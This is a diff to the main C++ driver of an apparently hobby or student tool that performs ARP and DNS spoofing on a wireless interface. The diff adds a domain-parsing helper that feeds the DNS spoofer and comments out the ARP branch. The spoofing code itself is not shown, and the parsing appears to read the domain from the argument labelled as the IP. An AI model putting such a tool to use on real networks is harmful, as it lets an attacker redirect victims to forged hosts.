@@ -1,12 +1,18 @@
 #include <iostream>
+#include <algorithm>
 #include "ArpSpoofer.h"
 #include "DnsSpoofer.h"
 #include "GatewayInfo.h"
+
+using std::for_each;
+using std::string;
 
 //char const *interface = "wlo1";
 char const *interface = "wlan0";
 
 uint8_t *getIpFromString(char *string);
+vector<string> get_domain_name(char *query_payload);
+
 
 int main(int argc, char * argv[]) {
     if(argc < 3){
@@ -15,19 +21,21 @@ int main(int argc, char * argv[]) {
         cout << "Using default: dns_spoofer wiekon.com.pl yafud.pl_ip" << endl;
     }
 
+//    cout << argv[1] << endl; //domain
+//    cout << argv[2] << endl; //ip
+    const vector<string> &domain = get_domain_name(argv[2]);
+
+
     GatewayInfo* gatewayInfo = new GatewayInfo();
     char *gw = gatewayInfo->getGateway();
     uint8_t *gateway = getIpFromString(gw);
-    char *s = new char[16];
-    sprintf(s, "%d.%d.%d.%d", gateway[0], gateway[1], gateway[2], gateway[3]);
-    cout << s << endl;
 
     if(fork()){
         DnsSpoofer *dnsSpoofer = new DnsSpoofer();
-        dnsSpoofer->start_spoofing(const_cast<char *>(interface));
+        dnsSpoofer->start_spoofing(const_cast<char *>(interface), domain);
     } else {
-        auto arpSpoofer = new ArpSpoofer();
-        arpSpoofer->start_spoofing(const_cast<char *>(interface), gateway);
+//        auto arpSpoofer = new ArpSpoofer();
+//        arpSpoofer->start_spoofing(const_cast<char *>(interface), gateway);
     }
 
     return 0;
@@ -37,4 +45,15 @@ uint8_t *getIpFromString(char *string) {
     unsigned char *buf = new unsigned char[(sizeof(struct in6_addr))];
     inet_pton(AF_INET, string, buf);
     return buf;
+}
+
+vector<string> get_domain_name(char *query_payload) {
+    vector<string> spoof_target;
+    char *names = strtok(query_payload, ".");
+    while(names != NULL){
+        spoof_target.push_back(reinterpret_cast<char*>(names));
+        names = strtok(NULL, ".");
+    }
+
+    return spoof_target;
 }
